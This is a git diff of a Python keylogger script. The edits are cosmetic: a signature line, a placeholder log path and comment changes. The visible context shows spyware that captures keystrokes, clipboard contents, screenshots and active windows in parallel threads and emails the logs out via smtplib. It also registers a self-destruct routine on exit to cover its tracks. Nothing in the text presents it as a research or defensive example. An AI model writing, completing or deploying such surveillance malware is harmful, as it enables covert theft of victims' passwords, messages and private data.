@@ -1,3 +1,4 @@
+# Cooked by Pradyun
 import keyboard
 import smtplib
 import time
@@ -11,7 +12,7 @@ import atexit
 import threading
 
 # Configuration
-LOG_DIR = r"C:\Users\prady\OneDrive\Desktop\projects\keylogg'd Captures"
+LOG_DIR = r"#PATH OF DIRECTORY WHERE YOU WANT TO CAPTURE KEYSTROKES"
 LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
 EMAIL_ADDRESS = os.environ.get(
     "EMAIL_ADDRESS"
@@ -36,7 +37,7 @@ def send_email(log_data):
 
 
 def log_keystrokes():
-    global start_time  # Declare it here
+    global start_time
     keystrokes = []
     start_time = time.time()  # Initialize start_time
     try:
@@ -107,7 +108,6 @@ def self_destruct():
 
 if __name__ == "__main__":
     start_time = time.time()  # Initialize start_time at the start
-    # Register self-destruction on exit (optional)
     atexit.register(self_destruct)
     # Start logging in threads
     keyboard_thread = threading.Thread(target=log_keystrokes, daemon=True)
@@ -119,7 +119,7 @@ if __name__ == "__main__":
     screenshot_thread.start()
     window_thread.start()
     try:
-        # Keep the program running
+        # to keep the program running
         keyboard_thread.join()
         clipboard_thread.join()
         screenshot_thread.join()
